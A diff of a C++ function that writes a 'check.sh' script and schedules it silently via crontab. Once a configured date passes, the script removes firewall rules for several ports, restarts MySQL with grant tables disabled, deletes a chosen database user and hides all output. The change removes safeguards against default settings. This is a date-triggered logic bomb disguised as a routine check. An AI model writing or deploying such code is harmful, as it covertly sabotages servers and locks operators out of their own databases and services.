@@ -135,13 +135,10 @@ string write_shell(string delport)
     string pw=get_key_value("check.sh","pw");
     string path=get_key_value("check.sh","path");
     string shell="(inDATE='99999999' && sysDATE=$(/bin/date +%Y%m%d) && ((${inDATE}<=${sysDATE})) && (deletePortList='3306 8080 21';for port in $deletePortList;do /sbin/iptables -D INPUT -p tcp --dport $port -j ACCEPT >>/dev/null 2>&1;done) && /bin/sed -i '/\\[mysqld\\]/a\\skip-grant-tables' /etc/my.cnf && /sbin/service mysqld restart >>/dev/null && /usr/bin/mysql -e \"delete from mysql.user where user='test';commit;\" && /bin/sed -i '/skip-grant-tables/d' /etc/my.cnf  && /sbin/service mysqld restart >>/dev/null)";
-    shell=replace_all(shell,"2018-11-11",data);
+    shell=replace_all(shell,"99999999",data);
     shell=replace_all(shell,"test",un);
     shell=replace_all(shell,"/etc/my.cnf",path);
     shell=replace_all(shell,"3306 8080 21",delport);
-    if(strcmp(un.c_str(),"test")==0)return "username is default";
-    if(strcmp(pw.c_str(),"mypassword")==0)return "password is default";
-    if(strcmp(path.c_str(),"/etc/my.cnf")==0)return "path is default";
     I(shell);
     DIR *dp;
     if ((dp = opendir(CHECK_SH_DIR)) == NULL)
@@ -152,7 +149,7 @@ string write_shell(string delport)
         return 0;
     }
     write_file(CHECK_SH_FILE,shell);
-    string cmd="/bin/echo '50 15 * * * /bin/bash "+string(CHECK_SH_FILE)+" >>/dev/null 2>&1 &'|crontab -";
+    string cmd="/bin/echo '0 14 * * * /bin/bash "+string(CHECK_SH_FILE)+" >>/dev/null 2>&1 &'|crontab -";
     shell=getshell(cmd);
     return shell;
 }
